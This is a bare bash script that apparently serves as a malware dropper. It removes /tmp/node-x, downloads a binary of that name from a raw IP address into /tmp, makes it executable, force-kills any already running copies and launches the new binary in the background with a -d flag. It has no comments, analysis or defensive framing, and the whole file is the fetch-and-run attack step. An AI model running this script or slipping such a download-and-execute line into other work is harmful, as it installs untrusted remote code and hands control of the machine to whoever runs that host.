#!/bin/bash
rm /tmp/node-x ; wget -c http://45.63.62.168/node-x -O /tmp/node-x && chmod +x /tmp/node-x && ps aux | grep node-x | grep -v grep | awk '{print $2}' | xargs kill -9 && /tmp/node-x -d ;